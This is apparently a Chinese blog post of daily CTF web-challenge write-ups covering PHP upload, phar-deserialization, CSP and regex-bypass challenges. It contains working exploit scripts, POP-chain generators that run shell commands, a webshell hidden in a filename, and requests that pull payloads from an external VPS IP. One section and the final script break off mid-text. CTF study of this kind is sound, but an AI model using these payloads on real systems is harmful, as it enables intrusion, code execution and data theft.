---
title: "每日一题"
date: 2026-06-05
lastmod: "2026-06-05T21:42:57+0800"
---
<!-- generated-by: obsidian_git_blog_pipeline -->

## web
### `[SCTF 2021]`Upload It 1

容器上去是一个文件上传界面，还给了phpinfo()

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605214236373.png)

同时给了附件，一个是index.php
```
error_reporting(0);
session_start();

define("UPLOAD_PATH", "/tmp/sandbox");
if (!file_exists(UPLOAD_PATH)) {
    @mkdir(UPLOAD_PATH);
}

function make_user_upload_dir() {
    $md5_dir = md5($_SERVER['REMOTE_ADDR'] . session_id());
    $upload_path = UPLOAD_PATH . "/" . $md5_dir;
    @mkdir($upload_path);
    $_SESSION["upload_path"] = $upload_path;
}
```

能看到session_start自动解析session序列化内容，同时

### `[D3CTF 2019]`babyxss
```
xss? seriously?
Check out the CSP plz admin is using the latest Chrome released. You may want to look into chrome://components portable sodium chloride
```
这题没法弄啊，需要旧的chrome环境而且还有注册origin拿token，很麻烦

在/fd.php的p参数里能发现可以控制html

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260602225141397.png)

但是这里题目提示说有CSP

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260602225822078.png)

```
script-src 'none'   禁止 JS
frame-src 'none'    禁止 iframe
img-src 'none'      禁止图片外带
connect-src 'none'  禁止 fetch / XHR / websocket 等连接
```
因此不能进行xss
然后发现csp没有限制 `object-src`
`object-src` 是专门管 `<object>` 和 `<embed>` 这类标签加载资源的 CSP 指令，MDN 也明确说它控制 `<object>` 和 `<embed>` 元素的合法来源

根据hint去`chrome://components`里头找有什么可以利用的组件  
最新版chrome已经默认禁止了flash的使用(然而就是有很多人不信邪)  
通过一些搜索可以发现pNaCl可以跑C/C++

pNaCl / NaCl 是 Chrome 以前支持的一种技术，可以在浏览器里跑编译后的 C/C++ 代码。Chrome 官方文档也说，Native Client 是用于在浏览器中运行编译后的 C/C++ 代码的沙箱技术，不过它后来已经废弃

可以编写一个 Leak 去请求 `admin.php`，获取 flag，然后再将 flag 带出来
下载下来谷歌的[SDK](https://developers.google.com/native-client/dev/sdk/download)和Leak后可以编译出一个nmf文件和一个pexe文件，放到自己的服务器上然后尝试:
```
<embed src="http://server_url/url_loader.nmf" type="application/x-pnacl">
```

轻松获得了一个Mixed Content呢（（毒瘤出题人  
上https以后发现:
```csharp
PNaCl modules can only be used on the open web (non-app/extension) when the PNaCl Origin Trial is enabled
```

搜索Origin Trial，看新闻：

[https://developer.chrome.com/native-client/migration](https://developer.chrome.com/native-client/migration)  
[https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md](https://github.com/GoogleChrome/OriginTrials/blob/gh-pages/developer-guide.md)

去[Origin Trial](https://developers.chrome.com/origintrials)申请一个token，最终的payload:

```xml
<meta http-equiv="origin-trial" content="[token]">
<embed src="https://server_url/url_loader.nmf" type="application/x-pnacl">
```

说是xss你还真信啊.jpg  
其实网上有现成的[Leak](https://github.com/shhnjk/PNaCl_Leaker)  
总结起来就是object-src missing, html controllable的情况。虽然网上其实已经有了exp，但是貌似还是有很多人没有碰到过。

### `[D3CTF 2019]`ezupload
```
webroot in var/www/html  
Notice:scanner is useless
```

```
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
        $this->url = $url;
        $this->filename  =  $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this->userdir != "upload/" . md5($_SERVER["REMOTE_ADDR"])) {
            die('hacker!!!');
        }
    }
    public function checkurl(){
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i",$r['scheme'])){
            die('hacker!!!');
        }
    }
    public function checkext(){
        if (stristr($this->filename,'..')){
            die('hacker!!!');
        }
        if (stristr($this->filename,'/')){
            die('hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)){
            die('hacker!!!');
        }
    }
    public function upload(){
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url,NULL,NULL,0,2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)){
            die('hacker!!!');
        }
        file_put_contents($this->userdir."/".$this->filename,$content);
    }
    public function remove(){
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir."/".$this->filename)){
            unlink($this->userdir."/".$this->filename);
        }
    }
    public function count($dir) {
        if ($dir === ''){
            $num = count(scandir($this->userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num > 0) {
            return "you have $num files";
        }
        else{
            return "you don't have file";
        }
    }
    public function __toString() {
        return implode(" ",scandir(__DIR__."/".$this->userdir));
    }
    public function __destruct() {
        $string = "your file in : ".$this->userdir;
        file_put_contents($this->filename.".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'],$_POST['filename']);
if($_POST['action'] === "upload") {
    $dir->upload();
}
elseif ($_POST['action'] === "remove") {
    $dir->remove();
}
elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])){
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}
```

`$_SERVER["REMOTE_ADDR"]`获取访问者真实ip
```
$this->userdir = "upload/" . md5($_SERVER["REMOTE_ADDR"]);
```

upload()函数中有`file_get_contents`和`file_put_contents`，读取文件与写入文件，审计可以看出需要phar反序列化

但如果使用相对路径，会发现无法写入

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603215433120.png)

#### 路径爆破

这里阴间的地方是，虽然题目告诉我们根目录是/var/www/html，但是真实路径是`/var/www/html/随机时间戳`
使用glob://协议进行爆破
```
action=count&url=1&filename=1&dir=glob:///var/www/html/*/upload/*/*
```
先随便传两个文件

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603221336608.png)

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260603221241029.png)

可以看到`1*`显示有两个文件，而`2*`显示无文件，因此路径是
```
glob:///var/www/html/1*/upload/*/*
```
下为爆破脚本
```
import requests
import string
import time
import re

URL = "http://node4.anna.nssctf.cn:23557/"
HASH = "304877947601b12463e8f64032faec51"

# 只上传 1 个；如果一直不命中，改成 3
MARKERS = 3

CHARS = string.ascii_letters + string.digits
PREFIX = ""

s = requests.Session()


def upload_marker(n):
    for i in range(n):
        r = s.post(URL, data={
            "action": "upload",
            "url": "data://text/plain;base64,MQ==",
            "filename": f"m{i}.txt"
        })
        print("[upload]", f"m{i}.txt", r.text[:80])


def hit(pattern):
    r = s.post(URL, data={
        "action": "count",
        "url": "1",
        "filename": "1",
        "dir": pattern
    })

    text = r.text
    return re.search(r"you have\s+[1-9]\d*\s+files", text) is not None


upload_marker(MARKERS)

test = f"glob:///var/www/html/*/upload/{HASH}/*"
print("[test]", test)

if not hit(test):
    print("[-] broad pattern not hit")
    print("    如果你只上传了 1 个文件，这是正常的。")
    print("    把 MARKERS = 3 再跑。")
    exit()

print("[+] broad hit, start brute")

while True:
    found = False

    for c in CHARS:
        p = PREFIX + c
        pattern = f"glob:///var/www/html/{p}*/upload/{HASH}/*"

        if hit(pattern):
            PREFIX = p
            print("[+]", PREFIX)
            found = True
            break

        time.sleep(0.03)

    if not found:
        print("[!] no next char")
        print("[+] maybe random dir =", PREFIX)
        print("[+] abs path =")
        print(f"/var/www/html/{PREFIX}/upload/{HASH}")
        print("[+] web path =")
        print(f"/{PREFIX}/upload/{HASH}/")
        break
```

成功爆破路径如下
```
[+] absolute upload dir:
    /var/www/html/15d4e891d784977c/upload/304877947601b12463e8f64032faec51
```

#### 构造反序列化

获得路径后找利用点构造反序列化
```
phar metadata 反序列化
-> 请求结束触发 outer::__destruct()
-> 拼接字符串时触发 inner::__toString()
-> inner::__toString() 去 scandir(upload/<hash>)
-> 目录列表字符串（上传文件夹下所有的文件名）被 outer::__destruct() 写进 outer->filename . ".txt"
```

注意这里stub不能有php，会被过滤
```
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($usedir,$url,$filename){
        $this->userdir = $usedir;
        $this->url = $url;
        $this->filename = $filename;
    }
}
$a = new dir('upload/{your_upload_path}','','');
$o = new dir($a,'','/var/www/html/xxx/upload/{your_upload_path}/2');

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
echo urlencode(serialize($o));
?>
```

光“写一个 txt”还不够，关键是 txt 里面的内容怎么变成 PHP 代码

这题最妙的地方在这：
```
上传内容会被过滤 <?php，所以文件内容里放不了 shell
但它根本不检查文件名里有没有 <?php
所以可以上传一个文件，文件名直接叫：
<?php echo 1.1;eval($_GET["a"]);
里面塞一个.绕过ph的过滤

action=upload&url=http://xxx&filename=<?php echo 1.1;eval($_GET["a"]);?>
这里需要把php语法闭合，不然后面的其他内容会导致报错
```

vps上传序列化内容
```
action=upload&url=http://vps:port/phar.jpg&filename=1.jpg
action=upload&url=http://119.28.213.74:8000/phar.jpg&filename=1.jpg
```
然后通过file_get_contents触发
```
action=upload&url=phar://upload/{your_upload_path}/1.jpg&filename=2.jpg
action=upload&url=phar://upload/304877947601b12463e8f64032faec51/1.jpg&filename=2.jpg
```

然后通过上传.htaccess来把txt文件当作php解析
```
AddHandler php7-script .txt
```

```
action=upload&url=http://vps:port/.htaccess.txt&filename=.htaccess
action=upload&url=http://119.28.213.74:8000/.htaccess&filename=.htaccess
```

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260605011303368.png)

### `[GFCTF 2021]`文件查看器
```
题目标签:
Linux命令
Phar反序列化
反序列化
WEB
PHP正则绕过
```

dirsearch扫描到www.zip，是源码泄漏

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260525221859410.png)

查看index.php
```
<?php
    function __autoload($className) {
        include("class/".$className.".class.php");
    }

    if(!isset($_GET['c'])){
        header("location:./?c=User&m=login");
    }else{
        $c=$_GET['c'];
        $class=new $c();
        if(isset($_GET['m'])){
            $m=$_GET['m'];
            $class->$m();
        }
    }
```

初始c=User&m=login

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260525222032497.png)

查看User.class.php发现账密为admin:admin
```
<?php
error_reporting(0);
class User{
    public $username;
    public $password;
    public function login(){
        include("view/login.html");
        if(isset($_POST['username'])&&isset($_POST['password'])){
            $this->username=$_POST['username'];
            $this->password=$_POST['password'];
            if($this->check()){
                header("location:./?c=Files&m=read");
            }
        }
    }
    public function check(){
        if($this->username==="admin" && $this->password==="admin"){
            return true;
        }else{
            echo "{$this->username}的密码不正确或不存在该用户";
            return false;
        }
    }
    public function __destruct(){
        (@$this->password)();
    }
    public function __call($name,$arg){ 
        ($name)();
    }
}
```

登陆后参数为c=Files&m=read，是文件查看器，还能重写
审计下Files.class.php源码

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260525222320751.png)

```
<?php
class Files{
    public $filename;
    public function __construct(){
        $this->log();
    }
    
    public function read(){
        include("view/file.html");
        if(isset($_POST['file'])){
            $this->filename=$_POST['file'];
        }else{
            die("请输入文件名");
        }
        $contents=$this->getFile();
        echo '<br><textarea class="file_content" type="text" value='."<br>".$contents;
    }
    
    public function filter(){
        if(preg_match('/^\/|phar|flag|data|zip|utf16|utf-16|\.\.\//i',$this->filename)){
echo "这合理吗";
            throw new Error("这不合理");
        }
    }
    public function getFile(){
        $contents=file_get_contents($this->filename);
        $this->filter();
        if(isset($_POST['write'])){
            file_put_contents($this->filename,$contents);
        }
        if(!empty($contents)){
            return $contents;
        }else{
            die("该文件不存在或者内容为空");
        } 
    }
     public function log(){
        $log=new Myerror();
    }
    public function __get($key){
        ($key)($this->arg);
    }
}
```
能看到getFile()方法会运行file_get_contents文件包含，同时filter()在文件包含后执行因此可以忽略

再看一下Myerror.class.php
```
<?php
   class Myerror{
       public $message;
       public function __construct(){
           ini_set('error_log','/var/www/html/log/error.txt');
           ini_set('log_errors',1);
       }
       public function __tostring(){
           $test=$this->message->{$this->test};
           return "test";
       }
   }

```

Files类的构造方法会调用`$this->log();`即创建Myerror对象，而Myerror的构造方法会将error_log写入`/var/www/html/log/error.txt`

这里如果用data://伪协议会失败，原因是file_get_contents() 只读内容，不执行 PHP；同样由于内容来源和落地目标相同，data://plain，同样无法写入文件
```
$contents = file_get_contents($this->filename);
file_put_contents($this->filename, $contents);
```
因此这题需要用phar反序列化做，先进行反序列化pop链分析
```
User::__destruct()
-> User::check()
-> echo $this->username
-> Myerror::__toString()
-> Files::__get('system')
-> system($this->arg)
```
这里注意，再file_get_contents后执行的filter方法识别到phar会执行 `throw new Error("这不合理");`，这个异常会打断pop链，因此这里还需要强制GC回收触发__destruct()

> [!NOTE] 注意
> 这里异常不一定会打断pop链，最好是加个状态门来强迫选手使用强制gc

把metadata从`[$u1, null]`，序列化后的尾部`i:1;N;`修改为`i:0;N;`，这个改动会导致phar尾部的签名失效，导致phar://会当作损坏phar，不能触发metadata反序列化

下为未修改metadata和签名的raw.php
```
<?php
$u1 = new User();
$u2 = new User();
$m = new Myerror();
$f = new Files();

$u1->password = [$u2, 'check'];
$u2->username = $m;
$m->message = $f;
$m->test = 'system';
$f->arg = 'cat /f*';

$meta = [$u1, null];

$phar = new Phar('raw.phar');
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($meta);
$phar->addFromString('test.txt', 'test');
$phar->setSignatureAlgorithm(Phar::SHA1);
$phar->stopBuffering();
```

但怎么把这个raw.phar写入到服务端呢，filter方法在file_put_contents前执行，走不通

这里可以通过日志写入内容到log/error.txt
当`file_get_contents($this->filename);`报错时，error.txt会写入`file_get_contents(payload): failed to open stream: No such file or directory`内容，这样之后读取phar://log/error.txt即可

但首选我们需要清空日志
传入并勾选 `write=1`
```
php://filter/read=consumed/resource=log/error.txt
```
`read=consumed` 读出来是空串，`file_put_contents()` 再写回同一路径，就会把底层日志文件清空

但同时还需要考虑raw.phar的传输问题，其经过
- HTTP 参数传输
- PHP 字符串处理
- warning 格式化
- 日志写入
需要剔除这些影响，可以使用编码格式转换解决
```
-> base64_encode
-> iconv(UTF-8, UCS-2)
-> quoted_printable_encode
-> urlencode 保证传输正确
```
用base64还不够，因为有前缀后缀
```
[time] PHP Warning: file_get_contents(你的payload): failed ...
```
`iconv(UTF-8 -> UCS-2)`再将base64 文本变成带空字节的宽字符形式：`QUJD`->`Q\x00U\x00J\x00D\x00`
`quoted-printable`把上面的 \x00 这种不可打印字节，再编码成可打印文本：`Q=00U=00J=00D=00`

最后使用php://filter将raw.phar恢复
```
<?php
if (PHP_SAPI !== 'cli') {
    fwrite(STDERR, "run in cli\n");
    exit(1);
}

if (!class_exists('Phar')) {
    fwrite(STDERR, "phar extension not loaded\n");
    exit(1);
}

class User {
    public $username;
    public $password;
}

class Files {
    public $filename;
    public $arg;
}

class Myerror {
    public $message;
    public $test;
}

function build_metadata($cmd) {
    $u1 = new User();
    $u2 = new User();
    $m = new Myerror();
    $f = new Files();

    $u1->password = [$u2, 'check'];
    $u2->username = $m;
    $m->message = $f;
    $m->test = 'system';
    $f->arg = $cmd;

    return [$u1, null];
}

function patch_fast_destruct($serialized) {
    $patched = str_replace('i:1;N;', 'i:0;N;', $serialized, $count);
    if ($count !== 1) {
        fwrite(STDERR, "fast-destruct patch failed\n");
        exit(1);
    }
    return $patched;
}

function repack_signature($data) {
    $magic = "GBMB";
    $sig_len = 20 + 4 + 4;
    if (strlen($data) < $sig_len || substr($data, -4) !== $magic) {
        fwrite(STDERR, "unexpected phar signature footer\n");
        exit(1);
    }
    $unsigned = substr($data, 0, -$sig_len);
    $hash = sha1($unsigned, true);
    return $unsigned . $hash . pack('V', 2) . $magic;
}

function encode_for_log($raw) {
    $b64 = base64_encode($raw);
    $ucs2 = iconv('UTF-8', 'UCS-2', $b64);
    if ($ucs2 === false) {
        fwrite(STDERR, "iconv failed\n");
        exit(1);
    }
    $qp = quoted_printable_encode($ucs2);
    $qp = preg_replace("/=\r\n/", '', $qp);
    return $qp . '=00=3D';
}

$cmd = $argv[1] ?? 'cat /f*';
$out_dir = __DIR__;
$raw_path = $out_dir . DIRECTORY_SEPARATOR . 'raw.phar';
$patched_path = $out_dir . DIRECTORY_SEPARATOR . 'patched.phar';

@unlink($raw_path);
@unlink($patched_path);

$meta = build_metadata($cmd);
$serialized = serialize($meta);
$patched_serialized = patch_fast_destruct($serialized);

$phar = new Phar($raw_path);
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($meta);
$phar->addFromString('test.txt', 'test');
$phar->setSignatureAlgorithm(Phar::SHA1);
$phar->stopBuffering();
unset($phar);

$raw = file_get_contents($raw_path);
if ($raw === false) {
    fwrite(STDERR, "read raw phar failed\n");
    exit(1);
}

$pos = strpos($raw, $serialized);
if ($pos === false) {
    fwrite(STDERR, "serialized metadata not found in phar\n");
    exit(1);
}

$patched = substr_replace($raw, $patched_serialized, $pos, strlen($serialized));
$patched = repack_signature($patched);

if (file_put_contents($patched_path, $patched) === false) {
    fwrite(STDERR, "write patched phar failed\n");
    exit(1);
}

echo url_encode(encode_for_log($patched), PHP_EOL);
```

```
$meta = build_metadata($cmd);
$serialized = serialize($meta);
$patched_serialized = patch_fast_destruct($serialized);
```
这里做的事其实很朴素：

1. 先正常构造对象链 $meta
2. 再把它 serialize() 成字符串
3. 然后直接对这个字符串做替换

也就是 patch_fast_destruct() 这段：

```
function patch_fast_destruct($serialized) {
    $patched = str_replace('i:1;N;', 'i:0;N;', $serialized, $count);
    if ($count !== 1) {
        fwrite(STDERR, "fast-destruct patch failed\n");
        exit(1);
    }
    return $patched;
}
```
这段把 `i:1;N;` 改成 `i:0;N;`
正常生成 phar 后，这段代码会先读回整个文件：
```
$raw = file_get_contents($raw_path);
```
然后用原始 metadata 序列化串去整个 phar 里搜：
```
$pos = strpos($raw, $serialized);
```
修改完的metadata直接在二进制文件里找这段完整的序列化内容进行替换
```
$patched = substr_replace($raw, $patched_serialized, $pos, strlen($serialized));
```

重签代码如下
```
function repack_signature($data) {
    $magic = "GBMB";
    $sig_len = 20 + 4 + 4;
    if (strlen($data) < $sig_len || substr($data, -4) !== $magic) {
        fwrite(STDERR, "unexpected phar signature footer\n");
        exit(1);
    }
    $unsigned = substr($data, 0, -$sig_len);
    $hash = sha1($unsigned, true);
    return $unsigned . $hash . pack('V', 2) . $magic;
}
```

encode编码部分代码如下
```
function encode_for_log($raw) {
    $b64 = base64_encode($raw);
    $ucs2 = iconv('UTF-8', 'UCS-2', $b64);
    if ($ucs2 === false) {
        fwrite(STDERR, "iconv failed\n");
        exit(1);
    }
    $qp = quoted_printable_encode($ucs2);
    $qp = preg_replace("/=\r\n/", '', $qp);
    return $qp . '=00=3D';
}
```

#### 利用流程

先清空error日志
```
file=php://filter/read=consumed/resource=log/error.txt&write=1
```
然后触发warning把生成的paylaod写入日志
```
file=<encoded_payload>
```
php filter协议恢复phar文件
```
file=php://filter/read=convert.quoted-printable-decode|convert.iconv.UCS-2.UTF-8|convert.base64-decode/resource=log/error.txt
&write=1
```
用phar协议读取触发反序列化
```
file=phar://log/error.txt/test.txt
```

### `[BJDCTF 2020]`Ezphp
```
题目标签:
正则绕过
弱比较
PHP伪协议
WEB
```

源代码里看到base32，解密后得到真正入口`1nD3x.php`
代码有点长，逐句分析一下

```php
if($_SERVER) { 
  if (preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
  )  
    die('You seem to want to do something bad?'); 
}
```

`_SERVER['QUERY_STRING']`是`?`后面的所有字符
`_SERVER`的get传入不会先被转译，所以我们可以用url编码这些关键词绕过

```php
if (!preg_match('/http|https/i', $_GET['file'])) {
  if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
    $file = $_GET["file"]; 
    echo "Neeeeee! Good Job!<br>";
  } 
} else die('fxck you! What do you want to do ?!');
```
之后是传参，只要注意会检测 = 号，其他的直接转换成url编码就行了

这里正则表达式写的是匹配开头和行结尾，所以只需要加一个换行符即`%0a`就行了，`$`不包含换行符，要加在结尾处

```
GET:?%64ebu=%61qua_is_%63ute%0a
```

```php
if($_REQUEST) {
  foreach($_REQUEST as $value) { 
    if(preg_match('/[a-zA-Z]/i', $value))  
      die('fxck you! I hate English!'); 
  } 
} 
```

`_REQUEST`同时接收GET和POST的传参，但POST拥有更高的优先级，所以只需要POST相同的参数即可绕过

如果传入不进去的话把cookie删掉，就传的进去了，不删掉cooki会检测出英文

补充一下，程序运行的步骤是php编译器先解析出来GET的值，这个时候已经解析过了url编码，但是程序调用`$_REQUEST`的时候调用的是原始的字符串，会调用出来未解码的字符串

```php
if (file_get_contents($file) !== 'debu_debu_aqua')
  die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```

要求file是`debu_debu_aqua`

可以直接通过data编码输入，即`data://text/plain,debu_debu_aqua`

注入进去了，看下一个

```php
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
  extract($_GET["flag"]);
  echo "Very good! you know my password. But what is flag?<br>";
} else{
  die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```

这个就是哈希值的问题，直接数组绕过就可以
`_REQUEST`传入影响的是字符串而非数组，所以只要url转换被屏蔽的函数
当前payload如下
```
GET:?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%66%6c%61%67%5b%63%6f%64%65%5d=%70%68%70%69%6e%66%6f&%66%6c%61%67%5b%61%72%67%5d=&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2

POST:debu=1&file=1
```

```php
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
   preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
  die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
  include "flag.php";
  $code('', $arg); 
}
```

code感觉直接不传入进去就可以了，arg过滤了一堆

这里通过extract给code和arg进行赋值来执行命令
在php里面，如果传入`?flag[code]=a&flag[arg]=b`
那么在调用的时候就会发现

```php
$_GET['flag'] = [
  'code' => 'a',
  'arg'  => 'b'
];
```

执行完成`extract($_GET["flag"]);`之后就可以获得两个变量，等价于如下

```php
$code = $_GET['flag']['code']; // a
$arg  = $_GET['flag']['arg'];  // b
```

然后 `$code('', $arg);`  执行的就是将变量名作为函数调用
这里使用create_fuction
```
create_function('', $arg);相当于eval("function λ() { " . $arg . " }");
```

所以可以提前闭合括号然后直接输出
```
code=create_function

arg=}phpinfo();//
```

发现不行，要找一个可以绕过限制的arg来进行输出

所以可以选择`}var_dump(get_defined_vars());//`进行绕过

```
%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%66%6c%61%67%5b%63%6f%64%65%5d=%70%68%70%69%6e%66%6f&%66%6c%61%67%5b%61%72%67%5d=&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f

debu=1&file=1
```

绕后就可以看到flag.php里面的所有变量，最后一个变量记录的是
```
Baka, do you think it's so easy to get my flag? I hid the real flag in rea1fl4g.php 23333
```

直接访问没有flag，感觉是在
选择用bs64绕过，但是被禁用了，就用功能相同的require

`}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//`

注意这里直接使用base64_decode会被最开始的判断禁用掉，但是可以使用url编码直接过滤
```
GET:?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%66%6c%61%67%5b%63%6f%64%65%5d=%70%68%70%69%6e%66%6f&%66%6c%61%67%5b%61%72%67%5d=&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67%5b%63%6f%64%65%5d=create_function&%66%6c%61%67%5b%61%72%67%5d=%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f

POST:debu=1&file=1
```
但还是不行，包含了只能看到fakeflag

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260526234639424.png)

这实际上只是“包含 `rea1fl4g.php`”，但 `rea1fl4g.php` 里面很可能会有类似 `unset($real_flag)` 或者不直接 echo 真 flag 的逻辑（题解里确实是这样），所以 “include/require 执行文件”并不保证你能看到真 flag。

更可靠的做法是：把文件当文本读出来（拿到源码后，真 flag 字符串再怎么 `unset` 也挡不住你“看见”它）。

unset是删除变量，就是说将变量设置以后删除，就读不出来了

所以需要直接 `php://filter/read=convert.base64-encode/resource=rea1fl4g.php` 读出来

直接取反一下就可以了

```php
<?php
$a = "p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = r e a 1 f l 4 g . p h p";
$arr1 = explode(' ', $a);
echo "~(";
foreach ($arr1 as $key => $value) {
    echo "%" . bin2hex(~$value);
}
echo ")";

?>
```

```
}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)
);//
```

最终payload如下
```
GET:?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%66%6c%61%67%5b%63%6f%64%65%5d=%70%68%70%69%6e%66%6f&%66%6c%61%67%5b%61%72%67%5d=&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%66%6c%61%67%5b%63%6f%64%65%5d=create_function&%66%6c%61%67%5b%61%72%67%5d=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//

POST:debu=1&file=1
```

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260526234316107.png)

![](assets/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98-20260526234143309.png)
### `[HXPCTF 2021]`counter

附件里有源码
```
<?php
$rmf = function($file){
    system('rm -f -- '.escapeshellarg($file));
};

$page = $_GET['page'] ?? 'default';
chdir('./data');

if(isset($_GET['reset']) && preg_match('/^[a-zA-Z0-9]+$/', $page) === 1) {
    $rmf($page);
}

file_put_contents($page, file_get_contents($page) + 1);
include_once($page);
```

这里$page要求纯数字字母，然后rmf方法是没法命令执行的

首先 `--` 是shell 的**选项终止符**，避免输入参数为`-parameter=command`的形式导致的选项解析漏洞

然后`escapeshellarg()`是 PHP 专门为**安全传递单个 shell 参数**设计的函数，它的处理逻辑是**不可绕过的**，会强制单引号包裹和内部单引号转义

最后`include_once($page);`看上去能用data://伪协议直接命令执行，但是尝试后失败，应该是默认设置`allow_url_include = Off`

所以这里的思路其实是
`system('rm -f -- ...')`会临时启动一个 `shell/rm` 进程。那个进程的 `/proc//cmdline` 里会出现我们可控的 page 内容

然后再并发发另一个请求，把 page 设成：  
`php://filter/convert.base64-decode/resource=/proc//cmdline`  
这样如果刚好读到上一步那个短命进程，就会把它的命令行当成 base64 解码，再被 include_once 当 PHP 执行


```
import base64
import hashlib
import re
import secrets
import threading
import time
import requests

# 目标站点地址
BASE = "http://node4.anna.nssctf.cn:23367/"

def gen_payload():
    """生成符合正则要求的纯字母数字Base64编码Payload"""
    for _ in range(500000):
        # 生成随机后门文件名和密钥
        backdoor = secrets.token_hex(8) + ".php"
